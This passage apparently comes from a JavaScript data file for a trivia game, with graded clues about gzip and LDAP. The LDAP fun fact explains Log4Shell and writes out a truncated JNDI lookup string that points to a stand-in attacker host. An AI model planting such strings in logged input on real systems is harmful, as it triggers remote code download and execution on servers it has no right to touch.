    clues: [
      'Jean-loup Gailly and Mark Adler wrote it in 1992 for the GNU project.',
      'It was made to replace compress, whose algorithm was patented.',
      'It uses the DEFLATE algorithm.',
      'Its files end in .gz, often after .tar.',
      'Web servers send it with a Content-Encoding header to shrink pages.',
      'The GNU compression tool, with a four-letter lowercase name.'
    ],
    funFact: "Mark Adler, one of its authors, also worked on the Mars rovers at NASA's Jet Propulsion Laboratory."
  },
  365: {
    clues: [
      'Tim Howes and others at the University of Michigan created it in 1993.',
      'It is a slimmed-down way to talk to X.500 directories.',
      'Entries have distinguished names like cn=Ada,dc=example,dc=com.',
      'In 2021, the Log4Shell attack abused lookups that pointed to it.',
      'Active Directory speaks it, and companies use it to store users and groups.',
      'The Lightweight Directory Access Protocol.'
    ],
    funFact: 'The Log4Shell attack worked by getting a server to log a string like ${jndi:ldap://attacker/...}, which made Java fetch and run remote code.'
  }
};
